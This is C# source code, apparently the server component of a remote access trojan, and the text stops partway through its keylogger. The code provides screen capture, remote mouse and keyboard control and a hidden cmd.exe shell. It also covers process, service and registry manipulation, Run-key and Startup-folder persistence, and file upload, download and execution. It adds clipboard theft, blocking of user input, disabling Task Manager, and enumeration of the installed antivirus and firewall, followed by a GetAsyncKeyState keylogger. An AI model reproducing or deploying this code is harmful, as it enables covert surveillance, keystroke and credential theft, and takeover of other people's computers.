using System;
using System.Collections.Generic;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.ServiceProcess;
using IWshRuntimeLibrary;
using System.Net.Sockets;

using LumiSoft.Net.UDP;
using LumiSoft.Net.Codec;
using LumiSoft.Media.Wave;
using System.Net;
using System.Management;
using System.Management.Instrumentation;
using System.Reflection;

namespace RemoteObject
{

    public class ScreenObject : MarshalByRefObject
    {
        #region Variables

        //Mouse Constants 
        private const UInt32 meLeftDown = 0x02;
        private const UInt32 meLeftUp = 0x04;
        private const UInt32 meRightDown = 0x08;
        private const UInt32 meRightUp = 0x10;
        //keylogger



        //active port
        public string strActivePort;

        //end active port
        private Point mouseLoc;
        public Point MouseLoc
        {
            get { return mouseLoc; }
            set
            {
                mouseLoc = value;
            }
        }

        ImageFormat imgFormat;

        Thread th;
        string strValue = "";

        enum imageFormats
        {
            BMP = 0,
            //  MemoryBMP,
            GIF,
            PNG,
            JPEG,
            //   TIFF,
            //   EMF,
            //   EXIF,
            //  WMF
        }



        private UdpServer m_pUdpServer = null;
        private WaveIn m_pWaveIn = null;
        private int m_Codec = 0;
        private static IPEndPoint m_pTargetEP;


        #endregion


        public ScreenObject()
        {


        }


        #region Screen Casting

        public MemoryStream CastScreen(int formatType, bool showMouse, bool realMouse)
        {
            MemoryStream ms;
            Bitmap bitmap;
            Bitmap outBmp;

            //real cursor
            int cursorX = 0;
            int cursorY = 0;
            Bitmap cursorBMP;
            Graphics g2;
            Rectangle r;


            //Get the Screen Bounds
            Rectangle bounds = Screen.GetBounds(Screen.GetBounds(Point.Empty));

            setImgFormat(formatType);

            using (bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                //Convert the Image to a JPG
                ms = new MemoryStream();

                if (showMouse)
                {
                    if (realMouse)
                    {
                        cursorBMP = CaptureCursor(ref cursorX, ref cursorY);
                        r = new Rectangle(cursorX, cursorY, cursorBMP.Width, cursorBMP.Height);
                        g2 = Graphics.FromImage(bitmap);
                        g2.DrawImage(cursorBMP, r);
                        g2.Flush();
                        outBmp = bitmap;
                    }
                    else
                    {
                        outBmp = drawMouse(bitmap);
                    }

                }
                else
                {
                    outBmp = bitmap;
                }

                outBmp.Save(ms, imgFormat);
                return ms;
            }
        }

        public void setImgFormat(int formatType)
        {
            switch (formatType)
            {
                case 0:
                    imgFormat = ImageFormat.Bmp;
                    break;
                case 1:
                    imgFormat = ImageFormat.Gif;
                    break;
                case 2:
                    imgFormat = ImageFormat.Png;
                    break;
                case 3:
                    imgFormat = ImageFormat.Jpeg;
                    break;
                default:
                    imgFormat = ImageFormat.Jpeg;
                    break;
            }
        }

        static Bitmap CaptureCursor(ref int x, ref int y)
        {
            Bitmap bmp;
            IntPtr hicon;
            Win32Stuff.CURSORINFO ci = new Win32Stuff.CURSORINFO();
            Win32Stuff.ICONINFO icInfo;
            ci.cbSize = Marshal.SizeOf(ci);
            if (Win32Stuff.GetCursorInfo(out ci))
            {
                if (ci.flags == Win32Stuff.CURSOR_SHOWING)
                {
                    hicon = Win32Stuff.CopyIcon(ci.hCursor);
                    if (Win32Stuff.GetIconInfo(hicon, out icInfo))
                    {
                        x = ci.ptScreenPos.x - ((int)icInfo.xHotspot);
                        y = ci.ptScreenPos.y - ((int)icInfo.yHotspot);

                        Icon ic = Icon.FromHandle(hicon);
                        bmp = ic.ToBitmap();
                        return bmp;
                    }
                }
            }

            return null;
        }

        public Bitmap drawMouse(Bitmap value)
        {
            Point mPoint;
            GetCursorPos(out mPoint);

            for (int i = -3; i < 3; i++)
            {
                for (int j = -3; j < 3; j++)
                {

                    value.SetPixel(mPoint.X + i, mPoint.Y + j, Color.Red);
                }

            }



            return value;
        }

        #endregion

        #region Mouse Methods

        public void GetMouseLocation(out Point point)
        {
            GetCursorPos(out point);
        }

        public void SetMouseLocation(Point mouseXY)
        {
            SetCursorPos(mouseXY.X, mouseXY.Y);
        }

        public void Left_Click_Down()
        {
            mouse_event(meLeftDown, 0, 0, 0, new System.IntPtr());
        }

        public void Left_Click_Up()
        {
            mouse_event(meLeftUp, 0, 0, 0, new System.IntPtr());
        }

        public void Right_Click_Down()
        {
            mouse_event(meRightDown, 0, 0, 0, new System.IntPtr());
        }

        public void Right_Click_Up()
        {
            mouse_event(meRightUp, 0, 0, 0, new System.IntPtr());
        }

        //user32.dll Mouse Methods
        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out System.Drawing.Point lpPoint);

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(UInt32 dwFlags, UInt32 dx, UInt32 dy, UInt32 dwData, IntPtr dwExtraInfo);

        #endregion

        #region Keyboard Methods

        public void keyboard_key_down(Byte KeyCode)
        {
            SendInput(KeyCode, (byte)MapVirtualKey((int)KeyCode, 0), 0, 0);
        }

        public void keyboard_key_up(Byte KeyCode)
        {
            SendInput((byte)KeyCode, (byte)MapVirtualKey((int)KeyCode, 0), 2, 0);
        }

        //user32.dll Keyboard Methods
        [DllImport("user32.dll")]
        public extern static short MapVirtualKey(int wCode, int wMapType);

        [DllImport("user32.dll", EntryPoint = "keybd_event", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern void SendInput(byte vk, byte scan, int flags, int extrainfo);

        #endregion




        //extra
        #region Get active port

        delegate string ReadLineDelegate();

        public string GetActivePorts()
        {
            try
            {

                Process prc = new Process();
                StreamWriter sw;
                StreamReader sr;

                prc.StartInfo.FileName = "cmd.exe";

                prc.StartInfo.UseShellExecute = false;
                prc.StartInfo.RedirectStandardOutput = true;
                prc.StartInfo.RedirectStandardInput = true;
                prc.StartInfo.CreateNoWindow = true;
                prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

                prc.Start();


                sw = prc.StandardInput;
                sr = prc.StandardOutput;


                sw.Write("netstat -a -n -o" + Environment.NewLine);
                strActivePort = string.Empty;
                string line;

                ReadLineDelegate rl = new ReadLineDelegate(sr.ReadLine);
                while (true)
                {
                    IAsyncResult ares = rl.BeginInvoke(null, null);
                    if (ares.AsyncWaitHandle.WaitOne(500) == false)
                    {
                        break;
                    }
                    line = rl.EndInvoke(ares);
                    if (line != null)
                    {
                        strActivePort += line + Environment.NewLine;
                    }
                }
                strActivePort = strActivePort.Substring(strActivePort.IndexOf("PID") + 3);

            }
            catch (Exception ex)
            {

            }
            return strActivePort;
        }
        #endregion



        #region Fun actions

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("winmm.dll")]
        private static extern long mciSendString(string strCommand, StringBuilder strReturn, int iReturnLength, IntPtr oCallback);

        [DllImport("user32.dll")]
        public static extern Int32 SwapMouseButton(Int32 bSwap);

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        public void OpenCDRom(string cmd)
        {
            switch (cmd)
            {
                case "OPEN":
                    mciSendString("set CDAudio door open", null, 127, IntPtr.Zero);
                    break;
                case "CLOSE":
                    mciSendString("set CDAudio door closed", null, 127, IntPtr.Zero);
                    break;
            }

        }

        public void TaskBar(string cmd)
        {
            if (cmd == "HIDE") HideTaskBar();
            else if (cmd == "SHOW") ShowTaskBar();
        }


        public void HideTaskBar()
        {
            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);
        }

        public void ShowTaskBar()
        {

            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_SHOW);
        }


        public void StartButton(string cmd)
        {
            if (cmd == "HIDE") HideStartButton();
        }

        public void HideStartButton()
        {
            IntPtr hwnd = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Shell_TrayWnd", null);
            hwnd = FindWindowEx(hwnd, IntPtr.Zero, "Button", null);

            //int hwnd = FindWindow("Shell_TrayWnd", "Button");
        }





        public void SwapMouse(string cmd)
        {
            switch (cmd)
            {
                case "SWITCH":
                    SwapMouseButton(1);
                    break;
                case "RESTORE":
                    SwapMouseButton(0);
                    break;
            }
        }

        public void Block(string action)
        {
            switch (action)
            {
                case "BLOCK":
                    BlockInput(true);
                    break;
                case "RESTORE":
                    BlockInput(false);
                    break;

            }
        }

        public void DisableTaskMgr()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1);
            }
            catch (Exception ex)
            {

            }
        }

        public void EnableTaskMgr()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0);
            }
            catch (Exception ex)
            {

            }
        }

        public void TaskMgr(string action)
        {
            switch (action)
            {
                case "ENABLE":
                    EnableTaskMgr();
                    break;
                case "DISABLE":
                    DisableTaskMgr();
                    break;
            }
        }

        //shut down,restart,log off
        public void Shutdown(string cmd)
        {
            try
            {
                Process.Start("shutdown", cmd);
            }
            catch (Exception ex)
            {

            }
        }


        #endregion

        #region Take process



        //lay tat ca process
        public string GetProcesses()
        {
            string query = "";

            foreach (Process proc in Process.GetProcesses())
            {
                string priority = string.Empty;
                try
                {
                    priority = proc.PriorityClass.ToString();
                }
                catch (Exception ex)
                {

                }
                string path = string.Empty;
                try
                {
                    path = proc.MainModule.FileName; ;
                }
                catch (Exception ex)
                {

                }
                query += proc.Id + "|*|" + proc.ProcessName + "|*|" + priority + "|*|" + path + Environment.NewLine;
            }

            return query;


        }

        public void KillProcess(int pid)
        {
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
            }
            catch (Exception ex)
            {

            }
        }







        #endregion

        #region Registry games :))
        public string GetSubKeys(string key, string register)
        {

            string query = "";
            RegistryKey regkey = null;

            switch (register)
            {
                case "HKEY_CLASSES_ROOT":
                    regkey = Registry.ClassesRoot.OpenSubKey(key);
                    break;
                case "HKEY_CURRENT_USER":
                    regkey = Registry.CurrentUser.OpenSubKey(key);
                    break;
                case "HKEY_LOCAL_MACHINE":
                    regkey = Registry.LocalMachine.OpenSubKey(key);
                    break;
                case "HKEY_USERS":
                    regkey = Registry.Users.OpenSubKey(key);
                    break;
                case "HKEY_CURRENT_CONFIG":
                    regkey = Registry.CurrentConfig.OpenSubKey(key);
                    break;
            }


            string[] subkeys = regkey.GetSubKeyNames();
            foreach (string subkey in subkeys)
            {
                query += subkey + Environment.NewLine;
            }

            return query;
        }

        #region Install Program
        public string GetInstalledPrograms()
        {

            string query = "";
            string SoftwareKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            RegistryKey keys = Registry.LocalMachine.OpenSubKey(SoftwareKey);
            foreach (string keyname in keys.GetSubKeyNames())
            {
                RegistryKey key = keys.OpenSubKey(keyname);
                try
                {
                    if (key.GetValue("DisplayName") != null)
                    {
                        if (key.GetValue("InstallLocation") == null)
                        {
                            query += key.GetValue("DisplayName") + "|*|Not found" + Environment.NewLine;
                        }
                        else
                        {
                            query += key.GetValue("DisplayName") + "|*|" + key.GetValue("InstallLocation") + Environment.NewLine;
                        }
                    }
                }
                catch (Exception ex)
                {

                }
            }
            return query;

        }
        #endregion

        public string GetValues(string key, string register)
        {

            string query = "";
            RegistryKey regkey = null;

            switch (register)
            {
                case "HKEY_CLASSES_ROOT":
                    regkey = Registry.ClassesRoot.OpenSubKey(key);
                    break;
                case "HKEY_CURRENT_USER":
                    regkey = Registry.CurrentUser.OpenSubKey(key);
                    break;
                case "HKEY_LOCAL_MACHINE":
                    regkey = Registry.LocalMachine.OpenSubKey(key);
                    break;
                case "HKEY_USERS":
                    regkey = Registry.Users.OpenSubKey(key);
                    break;
                case "HKEY_CURRENT_CONFIG":
                    regkey = Registry.CurrentConfig.OpenSubKey(key);
                    break;
            }


            string[] values = regkey.GetValueNames();
            foreach (string value in values)
            {
                //string details = (string)regkey.GetValue(register + "\\" + key, value);
                object test = Registry.GetValue(register + "\\" + key, value, "");

                query += value + "|*|" + test.ToString() + Environment.NewLine;
            }

            return query;


        }

        public void DeleteKey(string key, string register)
        {
            try
            {
                RegistryKey regkey = null;
                string path;
                string name;
                path = key.Substring(0, key.LastIndexOf(@"\") + 1);
                name = key.Substring(key.LastIndexOf(@"\") + 1);

                switch (register)
                {
                    case "HKEY_CLASSES_ROOT":
                        regkey = Registry.ClassesRoot.OpenSubKey(path, true);
                        regkey.DeleteValue(name);
                        break;
                    case "HKEY_CURRENT_USER":
                        regkey = Registry.CurrentUser.OpenSubKey(path, true);
                        regkey.DeleteValue(name);
                        break;
                    case "HKEY_LOCAL_MACHINE":
                        regkey = Registry.LocalMachine.OpenSubKey(path, true);
                        regkey.DeleteValue(name);
                        break;
                    case "HKEY_USERS":
                        regkey = Registry.Users.OpenSubKey(path, true);
                        regkey.DeleteValue(name);
                        break;
                    case "HKEY_CURRENT_CONFIG":
                        regkey = Registry.CurrentConfig.OpenSubKey(path, true);
                        regkey.DeleteValue(name);
                        break;
                }
            }
            catch (Exception ex)
            {

            }
        }


        public bool KeyExists(string key)
        {
            try
            {
                key = key.Trim();
                if (key.Substring(key.Length) != "\\")
                {
                    key += "\\";
                }
                string register = key.Substring(0, key.IndexOf("\\"));
                key = key.Substring(key.IndexOf("\\") + 1);
                bool exists = false;
                switch (register)
                {
                    case "HKEY_LOCAL_MACHINE":
                        exists = Registry.LocalMachine.OpenSubKey(key) != null;
                        break;
                    case "HKEY_CLASSES_ROOT":
                        exists = Registry.ClassesRoot.OpenSubKey(key) != null;
                        break;
                    case "HKEY_CURRENT_USER":
                        exists = Registry.CurrentUser.OpenSubKey(key) != null;
                        break;
                    case "HKEY_USERS":
                        exists = Registry.Users.OpenSubKey(key) != null;
                        break;
                    case "HKEY_CURRENT_CONFIG":
                        exists = Registry.CurrentConfig.OpenSubKey(key) != null;
                        break;
                }
                return exists;
            }
            catch (Exception ex)
            {
                return false;
            }
        }


        #endregion

        #region Remote Cmd
        Process cmd;
        StreamWriter stdin;
        StreamReader stdout;
        private string data = string.Empty;

        private bool firstrun;

        public void RemoteCmd()
        {
            try
            {
                firstrun = true;
                cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.UseShellExecute = false;

                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                cmd.Start();
                stdin = cmd.StandardInput;
                stdout = cmd.StandardOutput;

            }
            catch (Exception ex)
            {

            }

        }

        public void Write(string data)
        {
            try
            {
                stdin.WriteLine(data + Environment.NewLine);
            }
            catch (Exception ex)
            {

            }
        }


        public void Stop()
        {
            try
            {
                cmd.Kill();
                data = string.Empty;
            }
            catch (Exception ex)
            {

            }
        }

        public void Restart()
        {
            try
            {
                firstrun = true;
                cmd.Kill();
                while (!cmd.HasExited)
                {
                    System.Threading.Thread.Sleep(1);
                    Application.DoEvents();
                }
                data = string.Empty;
                cmd = new Process();
                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.UseShellExecute = false;
                cmd.StartInfo.CreateNoWindow = true;
                cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                cmd.StartInfo.RedirectStandardInput = true;
                cmd.StartInfo.RedirectStandardOutput = true;
                cmd.Start();
                stdin = cmd.StandardInput;
                stdout = cmd.StandardOutput;
            }
            catch (Exception ex)
            {

            }
        }

        //

        public string GetResponse()
        {
            try
            {
                data = string.Empty;
                string line;
                int sleep;
                if (firstrun)
                {
                    sleep = 400;
                }
                else
                {
                    sleep = 100;
                }

                ReadLineDelegate rl = new ReadLineDelegate(stdout.ReadLine);
                while (true)
                {
                    IAsyncResult ares = rl.BeginInvoke(null, null);
                    if (ares.AsyncWaitHandle.WaitOne(sleep) == false)
                    {
                        break;
                    }
                    line = rl.EndInvoke(ares);
                    if (line != null)
                    {
                        data += line + Environment.NewLine;
                    }
                }
            }
            catch (Exception ex)
            {

            }
            return data;

        }
        //
        #endregion

        #region Service Process
        public string GetServices()
        {
            string query = "";
            ServiceController[] services = ServiceController.GetServices();
            foreach (ServiceController service in services)
            {
                query += service.ServiceName + "|*|" + service.Status.ToString() + "|*|" + service.DisplayName + Environment.NewLine;
            }

            return query;

        }

        public void StartService(string servicename)
        {
            try
            {
                ServiceController service = new ServiceController();
                service.ServiceName = servicename;
                service.Start();
            }
            catch (Exception ex)
            {

            }
        }
        public void StopService(string servicename)
        {
            try
            {
                ServiceController service = new ServiceController();
                service.ServiceName = servicename;
                service.Stop();
            }
            catch (Exception ex)
            {

            }
        }

        public void Service(string cmd, string servicename)
        {
            switch (cmd)
            {
                case "START":
                    StartService(servicename);
                    break;
                default:
                    StopService(servicename);
                    break;
            }
        }
        #endregion

        #region Window

        [DllImport("user32.dll")]
        private static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DestroyWindow(IntPtr hwnd);


        private const int SW_SHOWNORMAL = 1;
        private const int SW_SHOWMINIMIZED = 2;
        private const int SW_SHOWMAXIMIZED = 3;
        private const int SW_RESTORE = 9;
        private const int SW_DEFAULT = 10;
        //lay cac cua so dang chay tren thanh taskbar
        public string GetWindows()
        {

            string query = "";
            Process[] proclist = Process.GetProcesses();
            IntPtr hwnd;
            foreach (Process proc in proclist)
            {
                if ((hwnd = proc.MainWindowHandle) != IntPtr.Zero)
                {
                    query += hwnd.ToString() + "|*|" + proc.MainWindowTitle + "|*|" + proc.ProcessName + "|*|" + proc.BasePriority + Environment.NewLine;
                }
            }

            return query;

        }


        //thao tac tren cac cua so dang chay 
        public void ChangeViewWindow(string _hwnd, string style)
        {
            IntPtr hwnd = new IntPtr(Convert.ToInt64(_hwnd));
            if (style == "MAXIMIZE")
            {
                ShowWindowAsync(hwnd, SW_SHOWMAXIMIZED);
            }
            else if (style == "MINIMIZE")
            {
                ShowWindowAsync(hwnd, SW_SHOWMINIMIZED);
            }
            else if (style == "NORMAL")
            {
                ShowWindowAsync(hwnd, SW_SHOWNORMAL);
            }
            else if (style == "HIDE")
            {
                ShowWindowAsync(hwnd, SW_HIDE);
            }
            else if (style == "CLOSE")
            {
                if (DestroyWindow(hwnd))
                {
                    //chua lam duoc
                }
                else
                {

                }
            }
        }
        #endregion

        #region Startup Program
        string StartupKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

        public string GetStartUpPrograms()
        {
            string query = "";

            try
            {

                RegistryKey key = Registry.CurrentUser.OpenSubKey(StartupKey);
                foreach (string program in key.GetValueNames())
                {
                    query += program + "|*|" + key.GetValue(program).ToString() + Environment.NewLine;
                }
                //RegistryEditor editor = new RegistryEditor();
                //if (editor.KeyExists(@"HKEY_LOCAL_MACHINE\" + StartupKey))
                //{
                key = Registry.LocalMachine.OpenSubKey(StartupKey);
                foreach (string program in key.GetValueNames())
                {
                    query += program + "|*|" + key.GetValue(program).ToString() + Environment.NewLine;
                }

                //}
                /*
                string map = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                WshShell shell = new WshShell();
                string[] files = System.IO.Directory.GetFiles(map);

                foreach (string file in files)
                {
                    string name = file.Substring(file.LastIndexOf(@"\") + 1);
                    if (name != "desktop.ini")
                    {
                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(file);
                        query += name.Substring(0, name.Length - 4) + "|*|" + shortcut.TargetPath+Environment.NewLine;
                    }
                }
                 */
            }
            catch (Exception ex)
            {

            }


            return query;
        }

        public void Remove(string program, string method)
        {
            switch (method)
            {
                case "CU":
                    RemoveCU(program);
                    break;
                case "LM":
                    RemoveLM(program);
                    break;
                case "SF":
                    RemoveSF(program);
                    break;
            }
        }

        public void RemoveCU(string program)
        {
            try
            {
                RegistryKey delkey = Registry.CurrentUser.OpenSubKey(StartupKey, true);
                delkey.DeleteValue(program);
            }
            catch (Exception ex)
            {

            }
        }

        public void RemoveLM(string program)
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(StartupKey, true);
                key.DeleteValue(program);
            }
            catch (Exception ex)
            {

            }

        }

        public void RemoveSF(string program)
        {
            try
            {

                string map = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                map += "\\" + program + ".lnk";
                if (System.IO.File.Exists(map))
                {
                    System.IO.File.Delete(map);
                }
            }
            catch (Exception ex)
            {

            }
        }

        public void Create(string program, string method, string path)
        {
            switch (method)
            {
                case "CU":
                    CreateCU(program, path);
                    break;
                case "LM":
                    CreateLM(program, path);
                    break;
                case "SF":
                    CreateSF(program, path);
                    break;
            }
        }

        public void CreateCU(string program, string path)
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", program, path);
            }
            catch (Exception ex)
            {

            }
        }

        public void CreateLM(string program, string path)
        {
            try
            {
                Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", program, path);
            }
            catch (Exception ex)
            {

            }

        }

        public void CreateSF(string program, string path)
        {
            try
            {
                string map = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                map += "\\" + program + ".lnk";

                WshShell shell = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(map);
                shortcut.TargetPath = path;
                shortcut.Save();
            }
            catch (Exception ex)
            {

            }
        }
        #endregion

        #region System info


        public string GetComputerName()
        {
            return Environment.MachineName;

        }

        public string GetUserName()
        {
            return Environment.UserName;
        }

        public string GetOSVersion()
        {
            return Environment.OSVersion.ToString();
        }
        public string GetRam()
        {
            try
            {
                ManagementScope oMs = new ManagementScope();
                ObjectQuery oQuery = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
                ManagementObjectSearcher oSearcher = new ManagementObjectSearcher(oMs, oQuery);
                ManagementObjectCollection oReturnCollection = oSearcher.Get();
                int ammount = 0;
                foreach (ManagementObject oReturn in oReturnCollection)
                {
                    object hoi = oReturn["Capacity"];
                    long temp = Convert.ToInt64(oReturn["Capacity"]) / 1024 / 1024 / 1024;
                    ammount += Convert.ToInt32(temp);
                }
                oMs = null;
                oQuery = null;
                oSearcher = null;
                oReturnCollection = null;
                return ammount.ToString() + " GB";

            }
            catch (Exception e)
            {
                return "Not Found";
            }
        }

        public string GetAntiVirus()
        {
            string str = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM AntivirusProduct");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementObject queryObj in instances)
            {
                str = queryObj["displayName"].ToString();
            }
            if (str == string.Empty)
            {
                str = "Not found";
            }
            return str;
        }

        public string GetFirewall()
        {
            string str = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "SELECT * FROM FirewallProduct");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementObject queryObj in instances)
            {
                str = queryObj["displayName"].ToString();
            }
            if (str == string.Empty)
            {
                str = "Not found";
            }
            return str;
        }

        #endregion

        #region File Manager
        public string GetDrives()
        {
            string[] drives = Environment.GetLogicalDrives();
            string query = "";
            foreach (string drive in drives)
            {
                query += drive + Environment.NewLine;
            }

            return query;
        }

        public string GetDirs(string parent)
        {

            string query = "";
            try
            {
                string[] folders = Directory.GetDirectories(@parent, "*", SearchOption.TopDirectoryOnly);
                foreach (string folder in folders)
                {
                    string temp = folder.Substring(folder.LastIndexOf("\\") + 1);
                    query += temp + Environment.NewLine;
                }
            }
            catch (Exception ex)
            {
                query = ex.Message;
            }
            return query;


        }

        public string GetFiles(string path)
        {

            string query = "";
            try
            {
                string[] files = Directory.GetFiles(path, "*", SearchOption.TopDirectoryOnly);
                foreach (string file in files)
                {
                    FileInfo info = new FileInfo(file);
                    string temp = file.Substring(file.LastIndexOf("\\") + 1);
                    string filesize = string.Empty;
                    Int64 size = info.Length;
                    long kb = size / 1024;
                    if (kb > 1024)
                    {
                        float mb = kb / 1024;
                        filesize = mb.ToString() + " MB";
                    }
                    else
                    {
                        filesize = kb.ToString() + " KB";
                    }

                    query += temp + "|*|" + info.CreationTime.ToString() + "|*|" + info.Attributes.ToString() + "|*|" + filesize + Environment.NewLine;
                }
            }
            catch (Exception ex)
            {
                query = ex.Message;
            }

            return query;

        }

        public void Execute(string path)
        {
            try
            {
                Process.Start(path);
            }
            catch (Exception ex)
            {

            }
        }
        public void Delete(string file)
        {
            try
            {
                System.IO.File.Delete(file);
            }
            catch (Exception e)
            {
                //Failed
            }
        }

        public void Create(string file)
        {
            try
            {
                System.IO.File.Create(file);
            }
            catch (Exception ex)
            {

            }
        }
        public void CreateFolder(string folder)
        {
            try
            {
                Directory.CreateDirectory(folder);
            }
            catch (Exception ex)
            {

            }
        }

        public byte[] Download(string path)
        {
            try
            {
                byte[] file = System.IO.File.ReadAllBytes(path);
                return file;
            }
            catch (Exception ex)
            {
                return new byte[0];
            }
        }

        public bool Upload(byte[] buff, string path)
        {
            try
            {
                FileStream fs = new FileStream(path, FileMode.Create, FileAccess.ReadWrite);
                BinaryWriter bw = new BinaryWriter(fs);
                bw.Write(buff);
                bw.Close();
                return true;
            }
            catch (Exception ex)
            {
            }
            return false;
        }
        public void Rename(string file, string to)
        {
            try
            {
                System.IO.File.Move(file, to);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        #endregion

        #region Clipboard
        //Text
        public string getClipboardText()
        {
            try
            {
                strValue = "";
                th = new Thread(new ThreadStart(getSTAText));
                th.SetApartmentState(ApartmentState.STA);
                th.Start();

                while (strValue == "")
                { }

                return strValue;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                return "";
            }
        }

        private void getSTAText()
        {
            strValue = Clipboard.GetText();
            if (strValue == "" || strValue == string.Empty)
            { strValue = "clipboard is empty"; }
        }

        public void setClipboardText(string value)
        {
            try
            {
                strValue = value;
                th = new Thread(new ThreadStart(setSTAText));
                th.SetApartmentState(ApartmentState.STA);
                th.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        private void setSTAText()
        {
            Clipboard.SetText(strValue);
        }

        #endregion

        #region Keylogger go!
        //-> Declare GetAsyncKeyState().
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey); //To check the current status of a virtual key.
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey); //To check the current status of a virtual key.
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Keys vKey); //To check if a key is currently toggled (on/off).
        [DllImport("user32.dll")]
        private static extern short GetKeyState(Int32 vKey); //To check if a key is currently toggled (on/off).

        //-> getKey() checks what keys have been pressed and returns the pressed keys, if any.
        //-> Otherwise, returns null.
        //-> The pressed keys are returned in a List<string> as (string)char/key name.
        public List<string> getKey()
        {
            List<string> myKeys = new List<string>(); //Declare the list of keys as int.
            for (int i = 0; i <= 255; i++) //Go through all key codes to check if any key is pressed.
            {
                int j = GetAsyncKeyState(i); //Get state of key i.
                if (j == -32767) //Check if key is pressed.
                {
                    if (i >= 65 && i <= 122) //From char 65 to 122
                    {
                        if (ShiftKey && CapsLock) //If Shift and CapsLock are toggled.
                            myKeys.Add(((char)(i + 32)).ToString()); //Lower case.
                        else if (ShiftKey) //If Shift or CapsLock is toggled.
                            myKeys.Add(((char)(i)).ToString()); //Upper case.
                        else if (CapsLock) //If Shift or CapsLock is toggled.
                            myKeys.Add(((char)(i)).ToString()); //Upper case.
                        else //Any other situation.
                            myKeys.Add(((char)(i + 32)).ToString()); //Lower case.
                    }
                    else if (i >= 48 && i <= 57) //From char 48 to 57
                    {
                        if (ShiftKey) //If Shift is toggled.
                            myKeys.Add(((char)(i - 16)).ToString()); //Symbols.
                        else //If Shift is not toggled.
                            myKeys.Add(((char)(i)).ToString()); //Numbers.
                    }
                    else
                        myKeys.Add(Enum.GetName(typeof(Keys), i)); //Any other situation.

                    //Check keys toggled
                    if (ShiftKey && !(myKeys.Contains(Keys.ShiftKey.ToString())))
                        myKeys.Add(Keys.ShiftKey.ToString()); //Add 'ShiftKey' if enabled.
                    if (ShiftKeyL && !(myKeys.Contains(Keys.LShiftKey.ToString())))
                        myKeys.Add(Keys.LShiftKey.ToString()); //Add 'LShiftKey' if enabled.
                    if (ShiftKeyR && !(myKeys.Contains(Keys.RShiftKey.ToString())))
                        myKeys.Add(Keys.RShiftKey.ToString()); //Add 'RShiftKey' if enabled.
                    if (ControlKey && !(myKeys.Contains(Keys.ControlKey.ToString())))
                        myKeys.Add(Keys.ControlKey.ToString()); //Add 'ControlKey' if enabled.
                    if (ControlKeyL && !(myKeys.Contains(Keys.LControlKey.ToString())))
                        myKeys.Add(Keys.LControlKey.ToString()); //Add 'LControlKey' if enabled.
                    if (ControlKeyR && !(myKeys.Contains(Keys.RControlKey.ToString())))
                        myKeys.Add(Keys.RControlKey.ToString()); //Add 'RControlKey' if enabled.
                    if (AltKey && !(myKeys.Contains(Keys.Menu.ToString())))
